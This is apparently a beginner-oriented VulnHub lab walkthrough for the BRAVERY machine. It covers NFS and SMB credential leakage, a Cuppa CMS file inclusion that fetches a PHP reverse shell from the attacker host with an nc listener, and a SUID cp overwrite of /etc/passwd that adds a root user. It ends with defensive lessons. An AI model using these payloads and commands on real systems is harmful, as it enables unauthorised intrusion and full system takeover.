# digitalworld.local: BRAVERY — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | digitalworld.local: BRAVERY |
| **Difficulty** | Easy / Medium |
| **Author** | Donavan |
| **Released** | 28 December 2018 |
| **VulnHub Entry** | [digitalworld.local: BRAVERY on VulnHub](https://vulnhub.com/entry/digitalworldlocal-bravery,281/) |
| **Download** | [bravery-improved.7z (~11 GB, via MEGA)](https://vulnhub.com/entry/digitalworldlocal-bravery,281/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian; Samba + NFS, nginx 1.12.2 on port 8080) |

> The official archive `bravery-improved.7z` is large (~11 GB) and hosted on MEGA. Its MD5 is
> `C9E2B9B36942515A1D0BBB191AC3B1EA`. There is no direct `download.vulnhub.com` mirror, so use the
> link on the VulnHub entry page.

---

## 0. What you will learn

By the end of this box you will have practised:

- **Multi-service enumeration**: an NFS export *and* Samba shares both leak data — you must combine them.
- **NFS enumeration**: listing and mounting an exported directory with `showmount` and `mount`.
- **SMB enumeration**: discovering shares with `enum4linux` and connecting with `smbclient`.
- **Credential chaining**: turning a password found in one service into access to another.
- **Web content discovery**: `gobuster`/`ffuf` to find hidden pages and a vulnerable CMS.
- **Cuppa CMS LFI/RFI (CVE-2020-26055)**: abusing a file-inclusion flaw in `alertConfigField.php`
  to get a reverse shell.
- **SUID abuse**: exploiting a SUID `cp` binary to overwrite `/etc/passwd` and add a root user.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA/VM.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

Identify your own lab address first (the interface facing the host-only network):

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

```bash
# ARP-scan the subnet — fast, no TCP packets, finds every live host
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (use whatever *you* discover).

> **Why it works:** Every host on the local segment must answer ARP regardless of its firewall, so
> ARP scanning is the most reliable way to spot a freshly imported VM.

---

## 2. Enumeration

BRAVERY exposes several network services, and the intended path threads between them.

### 2.1 Full TCP sweep

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/bravery-alltcp 192.168.56.101
```

### 2.2 Service/version detection

```bash
sudo nmap -sC -sV -p 22,80,111,139,445,8080,2049 -oA scans/bravery-services 192.168.56.101
```

```text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs         3-4 (RPC #100003)
8080/tcp open  http        nginx 1.12.2
```

> **How to read it:** For BRAVERY the interesting services are **NFS (2049/111)**, **SMB
> (139/445)**, and the two web servers (80 and 8080). Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 Enumerate the NFS export

```bash
showmount -e 192.168.56.101
```

```text
Export list for 192.168.56.101:
/var/nfsshare *
```

> **How to read it:** The `*` means the export is readable by **any** host. Mount it and read it:

```bash
mkdir -p /mnt/nfsshare
sudo mount -t nfs 192.168.56.101:/var/nfsshare /mnt/nfsshare
ls -la /mnt/nfsshare
cat /mnt/nfsshare/password.txt 2>/dev/null
```

```text
qwertyuioplkjhgfdsazxcvbnm
```

> **Why it works:** NFS applies **client-side** trust. When a share is exported to `*` with
> `no_root_squash`/permissive options, an unauthenticated client can mount and read it directly —
> no login required at all.

### 2.4 Enumerate Samba

```bash
enum4linux -a 192.168.56.101
```

```text
Sharename       Type      Comment
---------       ----      -------
anonymous       Disk
secured         Disk
```

> **How to read it:** `anonymous` *should* be world-readable, but `secured` should not. Note both —
> they matter shortly.

### 2.5 Read the SMB shares

Use the password we harvested from NFS (`qwertyuioplkjhgfdsazxcvbnm`) where the shares require auth:

```bash
smbclient //192.168.56.101/anonymous -N
# smb: \> ls
# smb: \> get README.txt
```

```bash
smbclient //192.168.56.101/secured -U David
# Password: qwertyuioplkjhgfdsazxcvbnm
# smb: \> ls
# smb: \> get david.txt
# smb: \> get genevieve.txt
```

```text
david.txt     genevieve.txt     README.txt
```

> **Why it works:** The password leaked by NFS is reused for the `secured` SMB share. Credential
> reuse across services is one of the most common real-world escalation aids. Some builds accept
> the share anonymously — "varies by build".

### 2.6 Web content discovery

```bash
gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```text
/devlopmentsecretpage     (Status: 301)
/devops/                  (Status: 301)
```

The `devops` directory contains a hint page:

```bash
curl http://192.168.56.101/devops/directortestpagev1.php
```

> **How to read it:** This points at a messy web root littered with custom PHP and an installed CMS.
> Keep enumerating that CMS.

---

## 3. Foothold

### 3.1 The vulnerability: Cuppa CMS file inclusion

Once Cuppa CMS is discovered under a path such as `/genevieve/cuppaCMS/`, its configuration field
loader accepts arbitrary URLs:

```text
/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=<URL>
```

> **Why it works:** `alertConfigField.php` passes `urlConfig` straight into a PHP file-include
> without validation, giving us **Local File Inclusion (LFI)** and — when remote URLs are allowed —
> **Remote File Inclusion (RFI)** leading to code execution.

### 3.2 Confirm LFI

```bash
curl "http://192.168.56.101/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=../../../../../../etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### 3.3 Turn RFI into a shell

Host a PHP reverse shell on Kali:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
# edit $ip and $port to 192.168.56.10:4444
python3 -m http.server 80
```

Start a listener:

```bash
nc -lvnp 4444
```

Trigger the include remotely:

```bash
curl "http://192.168.56.101/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.56.10/shell.php"
```

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# press Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

![the initial www-data shell](images/04-foothold.png)

---

## 4. Privilege escalation

### 4.1 Hunt for SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/sudo
/usr/bin/passwd
/bin/cp
...
```

> **Why it works:** A SUID binary runs with the **owner's** privileges. Here `/bin/cp` is owned by
> root, so a copy performed with it runs as root — and `cp` can overwrite any file, including
> `/etc/passwd`.

![SUID enumeration](images/07-privesc.png)

### 4.2 Add a root-privileged user

Generate a password hash for a new account:

```bash
openssl passwd -1 -salt hacked hacked
```

```text
$1$hacked$0nzCmf8mPtcmahC8Yvp9y/
```

Add the user to `/etc/passwd` using the SUID `cp` (we keep a backup first, then copy our modified
file into place):

```bash
cp /etc/passwd /tmp/passwd.bak
printf 'hacked:$1$hacked$0nzCmf8mPtcmahC8Yvp9y/:0:0:root:/root:/bin/bash\n' >> /tmp/passwd.new
/bin/cp /tmp/passwd.new /etc/passwd
su hacked
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **How to read it:** We appended a user whose UID is `0` (root) with a known hash, then overwrote
> `/etc/passwd` using the root-owned SUID `cp`. `su hacked` with the password `hacked` gives root.

### 4.3 The root flag

```bash
cat /root/proof.txt
```

```text
<root flag — varies by build>
```

> **Note:** BRAVERY also assembles a flag from several text files across the box; flag names and
> contents differ between builds. If `proof.txt` is missing, search `/root` for `*.txt`.

![root confirmation and flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | NFS export readable by any host (`/var/nfsshare *`) | NFS, port 2049 | Data disclosure — leaks a working password |
| 2 | Credential reuse; over-permissive SMB shares | Samba, ports 139/445 | Unauthorised file access on the `secured` share |
| 3 | Cuppa CMS LFI/RFI in `alertConfigField.php` | Web app on port 80 | Local/remote file inclusion → code execution → `www-data` |
| 4 | SUID `/bin/cp` | Local filesystem | Overwrite `/etc/passwd` to add a UID 0 user → root |

## 6. Defensive lessons (blue team)

- **Lock down NFS exports.** Never export to `*`. Restrict by host/network, mount read-only where
  possible, and normalise UIDs (`all_squash`) so clients cannot impersonate root.
- **Stop credential reuse.** A password that works for NFS should never also unlock SMB or SSH.
  Use unique, managed secrets (a vault) per service.
- **Patch/remove Cuppa CMS.** It is abandoned; the file-inclusion issue (CVE-2020-26055 and friends)
  is well known. Prefer a maintained CMS with input validation on any include path.
- **Follow the SUID principle of least privilege.** Remove SUID from generic tools like `cp`, `find`,
  `vim`, or `tar`. Audit SUID files regularly with `find / -perm -4000`.
- **Protect `/etc/passwd`.** Only root should be able to write it. Monitor for unexpected changes
  and alert on new UID 0 accounts.
- **Segment services and log access.** Place NFS/SMB on trusted internal networks only, and alert on
  unusual file reads or new writes to system files.

---

## 7. References

- [VulnHub official entry — digitalworld.local: BRAVERY](https://vulnhub.com/entry/digitalworldlocal-bravery,281/)
- [CVE-2020-26055 — Cuppa CMS remote/local file inclusion (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2020-26055)
- [Cuppa CMS — official site](https://www.cuppacms.com/)
- [Linux NFS security & `exports` options (man page)](https://linux.die.net/man/5/exports)
- [Samba `smb.conf` — share security (Samba docs)](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — TCP service scan (NFS, SMB, two web servers)
- [ ] `images/03-nfs-mount.png` — `showmount` + mounted share with `password.txt`
- [ ] `images/04-foothold.png` — Cuppa CMS RFI returning a `www-data` shell
- [ ] `images/05-smb-shares.png` — `enum4linux`/`smbclient` output for the SMB shares
- [ ] `images/06-lfi.png` — LFI proof (`/etc/passwd`)
- [ ] `images/07-privesc.png` — SUID `/bin/cp` discovery
- [ ] `images/08-root-flag.png` — `id` as root and the root flag

> **How to read it:** Store screenshots in `labs/digitalworldlocal-bravery/images/` and reference
> them here with relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
